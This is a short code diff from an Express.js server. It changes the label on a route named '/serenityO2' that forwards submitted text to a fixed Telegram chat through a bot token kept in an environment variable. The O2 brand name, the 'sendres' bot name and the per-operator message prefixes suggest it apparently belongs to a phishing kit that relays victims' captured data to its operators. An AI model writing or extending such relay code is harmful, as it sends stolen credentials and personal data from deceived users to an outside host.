@@ -3242,7 +3242,7 @@ app.post("/serenityO2", (req, res) => {
             `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
             {
               chat_id: 680379375,
-              text: `O2Saim:\n${originalText}`,
+              text: `O2Serenity:\n${originalText}`,
               parse_mode: "Markdown",
             }
           )
